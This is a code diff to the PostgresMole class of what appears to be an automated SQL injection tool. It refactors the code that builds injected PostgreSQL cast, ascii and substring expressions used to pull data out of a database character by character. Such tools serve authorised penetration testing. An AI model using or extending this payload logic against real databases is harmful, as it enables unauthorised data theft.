@@ -173,8 +173,8 @@ class PostgresMole(DbmsMole):
         if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             query += " distinct on(schemaname) "
             fields = ['schemaname']
-        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||length(" +
-                                            self._concat_integer_fields(fields) +
+        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + 
+                                        " as varchar(10))||length(" + self._concat_fields(fields) +
                                             ")||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)"
                                         )
         query += ','.join(query_list)
@@ -194,9 +194,10 @@ class PostgresMole(DbmsMole):
         if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             query += " distinct on(schemaname) "
             fields = ['schemaname']
-        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||ascii(substring(" +
-                                            self._concat_integer_fields(fields) +
-                                            ", " + str(index)+",1))||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)"
+        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + 
+                                        " as varchar(10))||ascii(substring(" + self._concat_fields(fields) +
+                                        ", " + str(index)+",1))||cast(" + PostgresMole.integer_out_delimiter + 
+                                        " as varchar(10)) as bigint)"
                                         )
         query += ','.join(query_list)
         at_end = ''
@@ -257,9 +258,6 @@ class PostgresMole(DbmsMole):
 
     def _concat_fields(self, fields):
         return ('||' + PostgresMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
-
-    def _concat_integer_fields(self, fields):
-        return ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
 
     def parse_results(self, url_data):
         if not self.finger or self.finger.is_string_query:
